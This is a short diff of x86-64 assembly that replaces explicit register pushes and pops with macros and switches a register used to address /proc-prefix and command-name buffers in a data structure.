@@ -1,9 +1,4 @@
-    push    rcx
-    push    rdi
-    push    rsi
-    push    rdx
-    push    r8
-
+    PUSH_ALLr
 
 
 
@@ -29,8 +24,8 @@
 
     ;lea     rdi, [rel path_buffer]
 
-    mov     rdi, [rbp + 16]
-    add     rdi, mydata.proc_prefix
+    mov     rsi, [rbp + 16]
+    add     rsi, mydata.proc_prefix
 
     ;lea     rsi, [rel proc_prefix]
     mov     rcx, 6
@@ -95,6 +90,7 @@
     jne     .no_newline
     mov     byte [rdi], 0
 .no_newline:
+
     mov     rsi, [rbp + 16]
     add     rsi, mydata.comm_buff
 
@@ -136,8 +132,4 @@
     mov     rax, 1
 
 .retf1:
-    pop     r8
-    pop     rdx
-    pop     rsi
-    pop     rdi
-    pop     rcx
+    POP_ALLr
